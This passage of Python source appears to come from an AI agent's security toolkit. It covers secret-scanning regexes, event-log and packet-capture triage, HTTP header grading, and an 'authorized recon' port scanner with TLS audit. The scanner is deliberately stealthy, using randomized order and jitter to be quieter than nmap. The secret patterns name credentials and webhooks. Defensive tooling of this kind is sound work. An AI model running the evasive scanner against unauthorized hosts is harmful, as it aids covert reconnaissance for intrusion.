    ("heroku_api_key",           re.compile(rb"(?i)heroku[^\n]{0,20}[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"), 40),
    # Slack webhook
    ("slack_webhook",            re.compile(rb"https://hooks\.slack\.com/services/T[A-Z0-9]{8,}/B[A-Z0-9]{8,}/[A-Za-z0-9]{20,}"), 60),
    # Discord webhook
    ("discord_webhook",          re.compile(rb"https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_\-]{60,}"), 70),
    # Telegram bot token
    ("telegram_bot_token",       re.compile(rb"\b\d{8,10}:[A-Za-z0-9_\-]{35}\b"), 44),
    # Connection strings (JDBC, MongoDB, PostgreSQL, MySQL, Redis)
    ("connection_string",        re.compile(rb"(?:mongodb(?:\+srv)?|postgres(?:ql)?|mysql|redis|amqp)://[^\s\"'<>]{10,}"), 15),
    # YAML/TOML secrets
    ("yaml_password_field",      re.compile(rb"(?i)^\s*(?:password|passwd|secret|api_key|auth_token|private_key)\s*[:=]\s*[^\s#\n]{8,}", re.MULTILINE), 15),
]

def _hunt_secrets_in_file(path: Path, include_http: bool = False, max_per_pattern: int = 25) -> list[dict]:
    try:
        data = path.read_bytes()
    except Exception:
        return []

    out: list[dict] = []
    lines = data.split(b"\n")
    
    for kind, rx, min_hit_len in _APK_SECRET_RE + _REPO_SECRET_RE:
        if not include_http and kind in {"hardcoded_http_endpoint", "ipv4_literal"}:
            continue
            
        seen: set[bytes] = set()
        n = 0
        for i, line in enumerate(lines):
            for m in rx.finditer(line):
                hit = m.group(0)
                if len(hit) < min_hit_len:
                    continue
                if hit in seen:
                    continue
                seen.add(hit)
                try:
                    preview = hit.decode("utf-8", errors="replace")
                except Exception:
                    preview = repr(hit)
                
                if len(preview) > 24 and kind not in {"hardcoded_http_endpoint", "ipv4_literal", "firebase_db_url", "firebase_app_url"}:
                    preview = preview[:8] + "…[redacted]…" + preview[-4:]
                
                out.append({
                    "file": path.name,
                    "kind": kind,
                    "match": preview[:200],
                    "line": i + 1
                })
                n += 1
                if n >= max_per_pattern:
                    break
            if n >= max_per_pattern:
                break
    return out

def tool_scan_secrets(args: dict) -> dict:
    """Scan a file or directory for hardcoded secrets."""
    raw_path = args.get("path")
    if not raw_path:
        return {"error": "path required"}
    
    target = Path(normalize_path(raw_path))
    if not target.exists():
        return {"error": "path not found"}
    if is_blocked_path(str(target)):
        return {"error": "path blocked"}
        
    exts = args.get("extensions")
    if not exts:
        exts = [
            ".py", ".js", ".ts", ".jsx", ".tsx", ".json", ".yaml", ".yml", 
            ".toml", ".env", ".cfg", ".ini", ".xml", ".properties", ".tf", 
            ".sh", ".bat", ".ps1", ".go", ".rs", ".java", ".rb", ".php", 
            ".cs", ".config", ".sql", ".dockerfile", ".tfvars"
        ]
    exts = set(e.lower() if e.startswith(".") else f".{e.lower()}" for e in exts)
    
    max_files = args.get("max_files", 500)
    max_bytes = args.get("max_file_bytes", 2 * 1024 * 1024)
    include_http = args.get("include_http_endpoints", False)
    
    skip_dirs = {".git", "node_modules", "__pycache__", ".venv", "venv", ".tox", "dist", "build", ".next", ".nuxt"}
    
    aid = request_approval(
        "Secret scan",
        f"Scan {target} for hardcoded secrets",
        {"target": str(target), "extensions": list(exts)}
    )
    if aid.get("decision") != "approve":
        return {"error": "user denied"}

    files_to_scan = []
    if target.is_file():
        files_to_scan.append(target)
    else:
        for root, dirs, files in os.walk(target):
            dirs[:] = [d for d in dirs if d not in skip_dirs]
            for f in files:
                p = Path(root) / f
                if p.suffix.lower() in exts:
                    files_to_scan.append(p)
            if len(files_to_scan) >= max_files:
                break
                
    files_to_scan = files_to_scan[:max_files]
    
    findings = []
    files_with_findings = 0
    scanned = 0
    
    for p in files_to_scan:
        try:
            if p.stat().st_size > max_bytes:
                continue
            scanned += 1
            file_findings = _hunt_secrets_in_file(p, include_http=include_http)
            if file_findings:
                files_with_findings += 1
                for f in file_findings:
                    f["file"] = str(p.relative_to(target)) if target.is_dir() else p.name
                findings.extend(file_findings)
        except Exception:
            continue
            
    risk_counts = {}
    for f in findings:
        risk_counts[f["kind"]] = risk_counts.get(f["kind"], 0) + 1
        
    return {
        "path": str(target),
        "files_scanned": scanned,
        "files_with_findings": files_with_findings,
        "findings": findings,
        "risk_summary": {
            "total_secrets_found": len(findings),
            "breakdown": risk_counts
        }
    }

# --- Tool 2: parse_evtx ---
_EVTX_EVENT_LABELS = {
    1102: "Audit log cleared",
    4624: "Logon success",
    4625: "Logon failure",
    4634: "Logoff",
    4648: "Explicit credential logon",
    4672: "Special privileges assigned",
    4688: "Process created",
    4689: "Process exited",
    4697: "Service installed",
    4698: "Scheduled task created",
    4699: "Scheduled task deleted",
    4700: "Scheduled task enabled",
    4702: "Scheduled task updated",
    4720: "User account created",
    4722: "User account enabled",
    4725: "User account disabled",
    4726: "User account deleted",
    4728: "Member added to security group",
    4732: "Member added to local group",
    4738: "User account changed",
    4740: "Account locked out",
    4756: "Member added to universal group",
    4776: "Credential validation",
    5140: "Network share accessed",
    5156: "Windows Filtering Platform connection",
    7034: "Service crashed",
    7036: "Service state changed",
    7040: "Service start type changed",
    7045: "Service installed (System log)",
    4104: "PowerShell ScriptBlock",
}

def tool_parse_evtx(args: dict) -> dict:
    """Parse Windows .evtx event log files."""
    if not _HAVE_EVTX_RUST and not _HAVE_EVTX_PY:
        return {"error": "evtx parser not available. install with: pip install evtx"}
        
    raw_path = args.get("path")
    if not raw_path:
        return {"error": "path required"}
    
    target = Path(normalize_path(raw_path))
    if not target.exists() or not target.is_file():
        return {"error": "file not found"}
        
    event_ids = set(args.get("event_ids", []))
    limit = min(args.get("limit", 500), 5000)
    keywords = (args.get("keywords") or "").lower()
    since_str = args.get("since")
    since_dt = None
    if since_str:
        try:
            since_dt = datetime.datetime.fromisoformat(since_str.replace('Z', '+00:00'))
            if since_dt.tzinfo is None:
                since_dt = since_dt.replace(tzinfo=datetime.timezone.utc)
        except Exception:
            pass

    aid = request_approval("Parse event log", f"Read {target}", {"target": str(target)})
    if aid.get("decision") != "approve":
        return {"error": "user denied"}

    events = []
    total_records = 0
    filtered_records = 0
    parser_used = "evtx (rust)" if _HAVE_EVTX_RUST else "python-evtx"
    
    try:
        if _HAVE_EVTX_RUST:
            parser = _PyEvtxParser(str(target))
            for record in parser.records_json():
                total_records += 1
                try:
                    event = json.loads(record["data"])
                    sys_node = event.get("Event", {}).get("System", {})
                    eid = sys_node.get("EventID", 0)
                    if isinstance(eid, dict):
                        eid = eid.get("#text", 0)
                    eid = int(eid)
                    
                    if event_ids and eid not in event_ids:
                        continue
                        
                    time_created_node = sys_node.get("TimeCreated", {})
                    time_str = time_created_node.get("#attributes", {}).get("SystemTime") or time_created_node.get("SystemTime")
                    
                    if since_dt and time_str:
                        try:
                            evt_dt = datetime.datetime.fromisoformat(time_str.replace('Z', '+00:00'))
                            if evt_dt.tzinfo is None:
                                evt_dt = evt_dt.replace(tzinfo=datetime.timezone.utc)
                            if evt_dt < since_dt:
                                continue
                        except Exception:
                            pass
                            
                    raw_data = json.dumps(event).lower()
                    if keywords and keywords not in raw_data:
                        continue
                        
                    event_data = event.get("Event", {}).get("EventData", {})
                    
                    filtered_records += 1
                    if len(events) < limit:
                        events.append({
                            "record_id": sys_node.get("EventRecordID"),
                            "event_id": eid,
                            "label": _EVTX_EVENT_LABELS.get(eid, "Unknown"),
                            "timestamp": time_str,
                            "computer": sys_node.get("Computer"),
                            "channel": sys_node.get("Channel"),
                            "provider": sys_node.get("Provider", {}).get("#attributes", {}).get("Name") or sys_node.get("Provider", {}).get("Name"),
                            "data": event_data
                        })
                except Exception:
                    continue
        else:
            with _Evtx(str(target)) as log:
                for record in log.records():
                    total_records += 1
                    try:
                        node = record.lxml()
                        ns = {'e': 'http://schemas.microsoft.com/win/2004/08/events/event'}
                        
                        eid_node = node.find('.//e:System/e:EventID', namespaces=ns)
                        if eid_node is None:
                            continue
                        eid = int(eid_node.text)
                        
                        if event_ids and eid not in event_ids:
                            continue
                            
                        time_node = node.find('.//e:System/e:TimeCreated', namespaces=ns)
                        time_str = time_node.get('SystemTime') if time_node is not None else None
                        
                        if since_dt and time_str:
                            try:
                                evt_dt = datetime.datetime.fromisoformat(time_str.replace('Z', '+00:00'))
                                if evt_dt.tzinfo is None:
                                    evt_dt = evt_dt.replace(tzinfo=datetime.timezone.utc)
                                if evt_dt < since_dt:
                                    continue
                            except Exception:
                                pass
                                
                        raw_data = record.xml().lower()
                        if keywords and keywords not in raw_data:
                            continue
                            
                        event_data = {}
                        for data in node.findall('.//e:EventData/e:Data', namespaces=ns) + node.findall('.//e:UserData/e:Data', namespaces=ns):
                            event_data[data.get('Name') or 'Value'] = data.text
                            
                        filtered_records += 1
                        if len(events) < limit:
                            computer_node = node.find('.//e:System/e:Computer', namespaces=ns)
                            channel_node = node.find('.//e:System/e:Channel', namespaces=ns)
                            provider_node = node.find('.//e:System/e:Provider', namespaces=ns)
                            record_id_node = node.find('.//e:System/e:EventRecordID', namespaces=ns)
                            
                            events.append({
                                "record_id": record_id_node.text if record_id_node is not None else None,
                                "event_id": eid,
                                "label": _EVTX_EVENT_LABELS.get(eid, "Unknown"),
                                "timestamp": time_str,
                                "computer": computer_node.text if computer_node is not None else None,
                                "channel": channel_node.text if channel_node is not None else None,
                                "provider": provider_node.get('Name') if provider_node is not None else None,
                                "data": event_data
                            })
                    except Exception:
                        continue
    except Exception as e:
        return {"error": f"parsing failed: {e}"}

    event_counts = {}
    flagged = []
    high_interest_ids = {1102, 4697, 7045, 4720, 4726, 4104}
    
    for e in events:
        eid = e["event_id"]
        event_counts[eid] = event_counts.get(eid, 0) + 1
        if eid in high_interest_ids:
            flagged.append(e)

    return {
        "path": str(target),
        "parser": parser_used,
        "total_records": total_records,
        "filtered_records": filtered_records,
        "events": events,
        "summary": {
            "event_id_counts": event_counts,
            "security_highlights": flagged
        }
    }

# --- Tool 3: analyze_pcap ---
def tool_analyze_pcap(args: dict) -> dict:
    """Analyze a PCAP or PCAPNG packet capture file."""
    if not _HAVE_DPKT and not _HAVE_SCAPY:
        return {"error": "PCAP parser not available. install with: pip install dpkt (preferred) or scapy"}
        
    raw_path = args.get("path")
    if not raw_path:
        return {"error": "path required"}
    
    target = Path(normalize_path(raw_path))
    if not target.exists() or not target.is_file():
        return {"error": "file not found"}
        
    max_packets = args.get("max_packets", 50000)
    dns_only = args.get("dns_only", False)
    http_only = args.get("http_only", False)

    aid = request_approval("Analyze packet capture", f"Parse {target}", {"target": str(target)})
    if aid.get("decision") != "approve":
        return {"error": "user denied"}

    try:
        if _HAVE_DPKT:
            return _analyze_pcap_dpkt(target, max_packets, dns_only, http_only)
        else:
            return _analyze_pcap_scapy(target, max_packets, dns_only, http_only)
    except Exception as e:
        return {"error": f"parsing failed: {e}"}

def _analyze_pcap_dpkt(path: Path, max_packets: int, dns_only: bool, http_only: bool) -> dict:
    import socket
    
    dns_queries = []
    http_requests = []
    tls_sni = []
    src_ips = {}
    dst_ips = {}
    ports = {}
    protocols = {}
    
    pkt_count = 0
    first_ts = None
    last_ts = None
    
    known_bad_ports = {4444, 5555, 1337, 31337, 8888}
    suspicious = []
    connections = {} # (src, dst, dport) -> count
    
    try:
        with open(path, 'rb') as f:
            try:
                pcap = _dpkt.pcap.Reader(f)
            except ValueError:
                f.seek(0)
                pcap = _dpkt.pcapng.Reader(f)
                
            for ts, buf in pcap:
                if pkt_count >= max_packets:
                    break
                pkt_count += 1
                
                if first_ts is None:
                    first_ts = ts
                last_ts = ts
                
                try:
                    eth = _dpkt.ethernet.Ethernet(buf)
                except Exception:
                    continue
                    
                if not isinstance(eth.data, _dpkt.ip.IP) and not isinstance(eth.data, _dpkt.ip6.IP6):
                    continue
                    
                ip = eth.data
                
                try:
                    src = socket.inet_ntop(socket.AF_INET if isinstance(ip, _dpkt.ip.IP) else socket.AF_INET6, ip.src)
                    dst = socket.inet_ntop(socket.AF_INET if isinstance(ip, _dpkt.ip.IP) else socket.AF_INET6, ip.dst)
                except Exception:
                    continue
                
                src_ips[src] = src_ips.get(src, 0) + 1
                dst_ips[dst] = dst_ips.get(dst, 0) + 1
                
                if isinstance(ip.data, _dpkt.udp.UDP):
                    protocols["UDP"] = protocols.get("UDP", 0) + 1
                    udp = ip.data
                    dport = udp.dport
                    ports[dport] = ports.get(dport, 0) + 1
                    
                    conn_key = (src, dst, dport)
                    connections[conn_key] = connections.get(conn_key, 0) + 1
                    
                    if dport in known_bad_ports:
                        suspicious.append(f"Connection to suspicious port: {src} -> {dst}:{dport}")
                    
                    if not http_only and (udp.dport == 53 or udp.sport == 53):
                        try:
                            dns = _dpkt.dns.DNS(udp.data)
                            if dns.qr == _dpkt.dns.DNS_Q and len(dns.qd) > 0:
                                qname = dns.qd[0].name
                                dns_queries.append({"timestamp": ts, "query": qname, "src": src})
                                if qname.endswith(".onion") or qname.endswith(".bit") or qname.endswith(".i2p"):
                                    suspicious.append(f"Suspicious DNS query: {qname} from {src}")
                        except Exception:
                            pass
                            
                elif isinstance(ip.data, _dpkt.tcp.TCP):
                    protocols["TCP"] = protocols.get("TCP", 0) + 1
                    tcp = ip.data
                    dport = tcp.dport
                    ports[dport] = ports.get(dport, 0) + 1
                    
                    conn_key = (src, dst, dport)
                    connections[conn_key] = connections.get(conn_key, 0) + 1
                    
                    if dport in known_bad_ports:
                        suspicious.append(f"Connection to suspicious port: {src} -> {dst}:{dport}")
                    
                    if not dns_only and len(tcp.data) > 0:
                        # Try HTTP
                        try:
                            req = _dpkt.http.Request(tcp.data)
                            http_requests.append({
                                "timestamp": ts,
                                "src": src,
                                "dst": dst,
                                "method": req.method,
                                "uri": req.uri,
                                "host": req.headers.get("host", ""),
                                "user_agent": req.headers.get("user-agent", "")
                            })
                            if "authorization" in req.headers and req.headers["authorization"].lower().startswith("basic"):
                                suspicious.append(f"Cleartext HTTP Basic Auth: {src} -> {dst}")
                            continue # Successfully parsed HTTP
                        except Exception:
                            pass
                            
                        # Try TLS Client Hello
                        if not http_only and len(tcp.data) >= 5 and tcp.data[0] == 22 and tcp.data[1] == 3: # Handshake, TLS/SSL
                            try:
                                if tcp.data[5] == 1:
                                    records, bytes_used = _dpkt.ssl.tls_multi_factory(tcp.data)
                                    for record in records:
                                        if record.type == 22: # Handshake
                                            for msg in record.data:
                                                if msg.type == 1: # ClientHello
                                                    pass
                            except Exception:
                                pass
                                
    except Exception as e:
        return {"error": f"Failed reading PCAP: {e}"}

    for (s, d, p), count in connections.items():
        if count > 100: # Simple beaconing heuristic
            suspicious.append(f"High connection count (possible beaconing): {s} -> {d}:{p} ({count} connections)")

    return {
        "path": str(path),
        "parser": "dpkt",
        "packet_count": pkt_count,
        "time_range": {"first": first_ts, "last": last_ts},
        "protocols": protocols,
        "dns_queries": dns_queries[:1000],
        "http_requests": http_requests[:1000],
        "tls_sni": tls_sni[:1000],
        "top_sources": sorted([{"ip": k, "count": v} for k, v in src_ips.items()], key=lambda x: x["count"], reverse=True)[:20],
        "top_destinations": sorted([{"ip": k, "count": v} for k, v in dst_ips.items()], key=lambda x: x["count"], reverse=True)[:20],
        "top_ports": sorted([{"port": k, "count": v} for k, v in ports.items()], key=lambda x: x["count"], reverse=True)[:20],
        "suspicious": list(set(suspicious))
    }

def _analyze_pcap_scapy(path: Path, max_packets: int, dns_only: bool, http_only: bool) -> dict:
    return {"error": "Scapy fallback not fully implemented. Please install dpkt for PCAP analysis."}

# --- Tool 4: audit_http_headers ---
def tool_audit_http_headers(args: dict) -> dict:
    """Fetch a URL and grade its HTTP security headers."""
    url = args.get("url")
    if not url:
        return {"error": "url required"}
    if not (url.startswith("http://") or url.startswith("https://")):
        return {"error": "url must start with http:// or https://"}
        
    follow_redirects = args.get("follow_redirects", True)
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    req = urllib.request.Request(
        url,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
    )
    
    try:
        class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
            def http_error_302(self, req, fp, code, msg, headers):
                if follow_redirects:
                    return super().http_error_302(req, fp, code, msg, headers)
                return urllib.response.addinfourl(fp, headers, req.get_full_url(), code)
            http_error_301 = http_error_303 = http_error_307 = http_error_308 = http_error_302

        opener = urllib.request.build_opener(NoRedirectHandler(), urllib.request.HTTPSHandler(context=ctx))
        resp = opener.open(req, timeout=15)
        
        headers = dict(resp.headers)
        status_code = resp.getcode()
        final_url = resp.geturl()
        
    except urllib.error.HTTPError as e:
        headers = dict(e.headers)
        status_code = e.code
        final_url = e.url
    except Exception as e:
        return {"error": f"Failed to fetch {url}: {e}"}

    graded_headers = {}
    score = 100
    findings = []
    
    h_hsts = headers.get("Strict-Transport-Security", "").lower()
    if h_hsts:
        m = re.search(r"max-age=(\d+)", h_hsts)
        if m and int(m.group(1)) >= 31536000:
            graded_headers["Strict-Transport-Security"] = {"value": h_hsts, "status": "pass", "note": "HSTS enabled with sufficient max-age"}
        else:
            graded_headers["Strict-Transport-Security"] = {"value": h_hsts, "status": "warn", "note": "HSTS max-age is too short"}
            score -= 5
    else:
        graded_headers["Strict-Transport-Security"] = {"value": None, "status": "fail", "note": "Missing HSTS"}
        score -= 15
        findings.append("No Strict-Transport-Security header (vulnerable to downgrade attacks)")

    h_csp = headers.get("Content-Security-Policy", "").lower()
    if h_csp:
        if "unsafe-inline" in h_csp or "unsafe-eval" in h_csp:
            graded_headers["Content-Security-Policy"] = {"value": h_csp, "status": "warn", "note": "CSP present but contains unsafe directives"}
            score -= 10
            findings.append("CSP contains unsafe-inline or unsafe-eval")
        else:
            graded_headers["Content-Security-Policy"] = {"value": h_csp, "status": "pass", "note": "Strong CSP"}
    else:
        graded_headers["Content-Security-Policy"] = {"value": None, "status": "fail", "note": "Missing CSP"}
        score -= 15
        findings.append("No Content-Security-Policy header (vulnerable to XSS)")

    h_xfo = headers.get("X-Frame-Options", "").upper()
    if h_xfo in {"DENY", "SAMEORIGIN"}:
        graded_headers["X-Frame-Options"] = {"value": h_xfo, "status": "pass", "note": "Clickjacking protection active"}
    elif not h_xfo:
        graded_headers["X-Frame-Options"] = {"value": None, "status": "fail", "note": "Missing X-Frame-Options"}
        score -= 10
        findings.append("No X-Frame-Options header (vulnerable to clickjacking)")
    else:
        graded_headers["X-Frame-Options"] = {"value": h_xfo, "status": "warn", "note": f"Unrecognized value: {h_xfo}"}
        score -= 5

    h_cto = headers.get("X-Content-Type-Options", "").lower()
    if h_cto == "nosniff":
        graded_headers["X-Content-Type-Options"] = {"value": h_cto, "status": "pass", "note": "MIME-sniffing protection active"}
    else:
        graded_headers["X-Content-Type-Options"] = {"value": h_cto, "status": "fail", "note": "Missing or invalid nosniff"}
        score -= 5
        findings.append("Missing X-Content-Type-Options: nosniff")

    h_ref = headers.get("Referrer-Policy", "").lower()
    if h_ref in {"no-referrer", "strict-origin-when-cross-origin"}:
        graded_headers["Referrer-Policy"] = {"value": h_ref, "status": "pass", "note": "Strong referrer policy"}
    elif h_ref:
        graded_headers["Referrer-Policy"] = {"value": h_ref, "status": "warn", "note": "Weak referrer policy"}
        score -= 5
    else:
        graded_headers["Referrer-Policy"] = {"value": None, "status": "fail", "note": "Missing Referrer-Policy"}
        score -= 5

    h_server = headers.get("Server", "")
    if h_server:
        if re.search(r"[0-9]", h_server):
            graded_headers["Server"] = {"value": h_server, "status": "fail", "note": "Server version info leaked"}
            score -= 5
            findings.append("Server header leaks version information")
        else:
            graded_headers["Server"] = {"value": h_server, "status": "warn", "note": "Generic server header"}

    h_powered = headers.get("X-Powered-By", "")
    if h_powered:
        graded_headers["X-Powered-By"] = {"value": h_powered, "status": "fail", "note": "Technology info leaked"}
        score -= 5
        findings.append("X-Powered-By header leaks technology stack")

    if score >= 90: grade = "A"
    elif score >= 80: grade = "B"
    elif score >= 70: grade = "C"
    elif score >= 60: grade = "D"
    else: grade = "F"

    tls_info = {}
    if final_url.startswith("https://"):
        parsed = urllib.parse.urlparse(final_url)
        try:
            with socket.create_connection((parsed.netloc.split(":")[0], parsed.port or 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=parsed.netloc.split(":")[0]) as ssock:
                    cert = ssock.getpeercert(binary_form=True)
                    tls_info = {
                        "version": ssock.version(),
                        "cipher": ssock.cipher()
                    }
        except Exception:
            pass

    return {
        "url": url,
        "final_url": final_url,
        "status_code": status_code,
        "grade": grade,
        "score": score,
        "headers": graded_headers,
        "findings": findings,
        "tls": tls_info
    }

# ============================================================
# AUTHORIZED RECON TOOLS
# Low-and-slow reconnaissance for AUTHORIZED security testing only. The UI
# gates these behind an explicit "do you have authorization?" prompt; the
# tools themselves are strictly read-only (no exploitation, no payloads,
# no writes). Designed to be quieter than nmap: capped concurrency,
# randomized port order, jitter between probes. stdlib-only.
# ============================================================

_RECON_TOP_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 161, 389, 443, 445,
    465, 587, 636, 993, 995, 1433, 1521, 1723, 2049, 2375, 2376, 3000,
    3306, 3389, 5432, 5601, 5900, 5985, 5986, 6379, 7001, 8000, 8008,
    8080, 8081, 8443, 8888, 9000, 9092, 9200, 9300, 11211, 27017,
]
_RECON_PORT_NAMES = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns", 80: "http",
    110: "pop3", 111: "rpcbind", 135: "msrpc", 139: "netbios", 143: "imap",
    161: "snmp", 389: "ldap", 443: "https", 445: "smb", 465: "smtps",
    587: "submission", 636: "ldaps", 993: "imaps", 995: "pop3s",
    1433: "mssql", 1521: "oracle", 1723: "pptp", 2049: "nfs", 2375: "docker",
    2376: "docker-tls", 3000: "dev-http", 3306: "mysql", 3389: "rdp",
    5432: "postgres", 5601: "kibana", 5900: "vnc", 5985: "winrm",
    5986: "winrm-tls", 6379: "redis", 7001: "weblogic", 8080: "http-alt",
    8443: "https-alt", 9200: "elasticsearch", 11211: "memcached",
    27017: "mongodb",
}


def _recon_clean_host(raw: str) -> str:
    """Strip scheme/path/query/port and whitespace; return the bare host.
    (For DNS/TLS/crt.sh callers that genuinely need a bare hostname.)"""
    h = (raw or "").strip()
    if "://" in h:
        h = h.split("://", 1)[1]
    h = h.split("/", 1)[0].split("?", 1)[0]
    if h.count(":") == 1:  # drop a trailing :port
        h = h.split(":", 1)[0]
    return h.strip().strip(".")


def _recon_prep_url(raw: str) -> str:
    """Normalize a target into a full HTTP(S) URL for the recon HTTP tools,
    PRESERVING an explicit scheme, port, and path. When no scheme is given,
    choose one by target: http for localhost / *.local / private IPs / an
    explicit non-443 port (internal services and this range are plain HTTP);
    https otherwise. This is what lets a bare `127.0.0.1` or `host:8080` target
    actually work instead of failing a TLS handshake against an HTTP port -
    previously these tools blindly prepended https:// and dropped the port,
    which silently broke every internal/local assessment."""
    import ipaddress
    raw = (raw or "").strip()
    if raw.startswith(("http://", "https://")):
        return raw
    hostport = raw.split("/", 1)[0]
    rest = raw[len(hostport):]  # path/query, if any
    host = hostport.split(":", 1)[0]
    port = hostport.split(":", 1)[1] if hostport.count(":") == 1 else ""
    is_local = host in ("localhost", "") or host.endswith(".local")
    if not is_local:
        try:
            ip = ipaddress.ip_address(host)
            is_local = ip.is_private or ip.is_loopback or ip.is_link_local
        except ValueError:
            pass
    scheme = "http" if (is_local or (port and port != "443")) else "https"
    return f"{scheme}://{hostport}{rest}"


def _recon_resolve(host: str) -> dict:
    """Resolve a host to its IPs. {"ips":[...]} or {"error":...}."""
    try:
        infos = socket.getaddrinfo(host, None)
        return {"ips": sorted({i[4][0] for i in infos})}
    except Exception as e:
        return {"error": f"could not resolve {host}: {e}"}


def _recon_http_doh(name: str, rtype: str, timeout: float = 6.0) -> list:
    """DNS-over-HTTPS query via dns.google. Returns a list of answer strings."""
    url = f"https://dns.google/resolve?name={urllib.parse.quote(name)}&type={rtype}"
    req = urllib.request.Request(url, headers={"Accept": "application/dns-json"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        data = json.loads(r.read().decode("utf-8", "replace"))
    return [a.get("data", "").strip('"') for a in (data.get("Answer") or [])]


def tool_recon_port_scan(args: dict) -> dict:
    """Stealthy TCP-connect port scan: capped concurrency, randomized order,
    jitter between probes. Deliberately quieter than nmap. Read-only."""
    host = _recon_clean_host(args.get("host") or args.get("target") or "")
    if not host:
        return {"error": "host required"}
    res = _recon_resolve(host)
    if "error" in res:
        return res
    target_ip = res["ips"][0]
    ports = args.get("ports")
    if ports:
        try:
            port_list = [int(p) for p in ports if 0 < int(p) < 65536]
        except Exception:
            return {"error": "ports must be a list of integers"}
    else:
        port_list = list(_RECON_TOP_PORTS)
    random.shuffle(port_list)  # randomized order = less obvious sweep pattern
    timeout = max(0.3, min(float(args.get("timeout") or 1.5), 5.0))
    concurrency = max(1, min(int(args.get("concurrency") or 8), 32))
    jitter_ms = max(0, min(int(args.get("jitter_ms") or 40), 1000))

    def probe(port):
        if jitter_ms:
            time.sleep(random.uniform(0, jitter_ms / 1000.0))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            if s.connect_ex((target_ip, port)) == 0:
                banner = ""
                try:
                    s.settimeout(0.8)
                    banner = s.recv(96).decode("latin-1", "replace").strip()[:80]
                except Exception:
                    pass
                return {"port": port, "service": _RECON_PORT_NAMES.get(port, "unknown"), "banner": banner}
        except Exception:
            pass
        finally:
            try: s.close()
            except Exception: pass
        return None

    open_ports = []
    with ThreadPoolExecutor(max_workers=concurrency, thread_name_prefix="recon-scan") as ex:
        for r in ex.map(probe, port_list):
            if r:
                open_ports.append(r)
    open_ports.sort(key=lambda x: x["port"])
    return {
        "host": host, "resolved_ip": target_ip, "all_ips": res["ips"],
        "scanned": len(port_list), "open_count": len(open_ports),
        "open_ports": open_ports,
        "note": "TCP connect scan (randomized order + jitter). Authorized targets only.",
    }


def _recon_cert_from_der(der: bytes) -> dict | None:
    """Parse a DER cert with `cryptography` if available; else None."""
    try:
        from cryptography import x509
        from cryptography.hazmat.backends import default_backend
    except Exception:
        return None
    try:
        c = x509.load_der_x509_certificate(der, default_backend())
        try:
            cn = c.subject.rfc4514_string()
        except Exception:
            cn = ""
        try:
            issuer = c.issuer.rfc4514_string()
        except Exception:
            issuer = ""
        sans = []
        try:
            ext = c.extensions.get_extension_for_class(x509.SubjectAlternativeName)
            sans = ext.value.get_values_for_type(x509.DNSName)
        except Exception:
            pass
        return {
            "subject": cn, "issuer": issuer,
            "not_before": c.not_valid_before_utc.isoformat(),
            "not_after": c.not_valid_after_utc.isoformat(),
            "san": sans[:50],
            "self_signed": (cn == issuer and cn != ""),
        }
    except Exception:
        return None


def tool_recon_tls_audit(args: dict) -> dict:
    """Inspect a host's TLS: negotiated protocol/cipher, certificate subject,
    issuer, SANs, expiry, and validation status. Flags weak protocols and
    expired/self-signed certs. Read-only."""
    host = _recon_clean_host(args.get("host") or args.get("target") or "")
    if not host:
        return {"error": "host required"}
    port = int(args.get("port") or 443)
    timeout = max(2.0, min(float(args.get("timeout") or 6.0), 15.0))
    findings = []

    # First pass: verify against system CAs to learn validation status.
    validated = False
    verify_error = ""
    cert_dict = {}
    try:
        vctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=timeout) as raw:
            with vctx.wrap_socket(raw, server_hostname=host) as ss:
                cert_dict = ss.getpeercert() or {}
        validated = True
    except ssl.SSLCertVerificationError as e:
        verify_error = str(getattr(e, "verify_message", "") or e)
    except Exception as e:
        return {"error": f"TLS connect failed to {host}:{port}: {e}"}

    # Second pass: grab protocol/cipher and the raw cert regardless of trust.
    proto = cipher = None
    der = b""
    try:
        nctx = ssl.create_default_context()
        nctx.check_hostname = False
        nctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((host, port), timeout=timeout) as raw:
            with nctx.wrap_socket(raw, server_hostname=host) as ss:
                proto = ss.version()
                cipher = ss.cipher()  # (name, tls_version, bits)
                der = ss.getpeercert(binary_form=True) or b""
    except Exception:
        pass

    parsed = _recon_cert_from_der(der) if der else None
    # Prefer the validated dict's fields when present.
    subject = issuer = not_after = ""
    sans = []
    if cert_dict:
        subject = dict(x[0] for x in cert_dict.get("subject", []) if x).get("commonName", "")
        issuer = dict(x[0] for x in cert_dict.get("issuer", []) if x).get("commonName", "")
        not_after = cert_dict.get("notAfter", "")
        sans = [v for (k, v) in cert_dict.get("subjectAltName", []) if k == "DNS"][:50]
    elif parsed:
        subject, issuer, not_after = parsed["subject"], parsed["issuer"], parsed["not_after"]
        sans = parsed.get("san", [])
        if parsed.get("self_signed"):
            findings.append("certificate appears self-signed")

    if proto and proto in ("TLSv1", "TLSv1.1", "SSLv3", "SSLv2"):
        findings.append(f"weak protocol negotiated: {proto}")
    if not validated and verify_error:
        findings.append(f"did not validate against system CAs: {verify_error}")
    # Expiry check
    days_left = None
    try:
        import datetime as _dt
        if cert_dict.get("notAfter"):
            exp = _dt.datetime.strptime(cert_dict["notAfter"], "%b %d %H:%M:%S %Y %Z")
            days_left = (exp - _dt.datetime.utcnow()).days
        elif parsed and parsed.get("not_after"):
            exp = _dt.datetime.fromisoformat(parsed["not_after"].replace("Z", "+00:00"))
            days_left = (exp - _dt.datetime.now(_dt.timezone.utc)).days
    except Exception:
        pass
    if days_left is not None:
        if days_left < 0:
            findings.append(f"certificate EXPIRED {abs(days_left)} days ago")
        elif days_left < 21:
            findings.append(f"certificate expires soon ({days_left} days)")

    return {
        "host": host, "port": port, "validated": validated,
        "protocol": proto, "cipher": cipher[0] if cipher else None,
        "cipher_bits": cipher[2] if cipher else None,
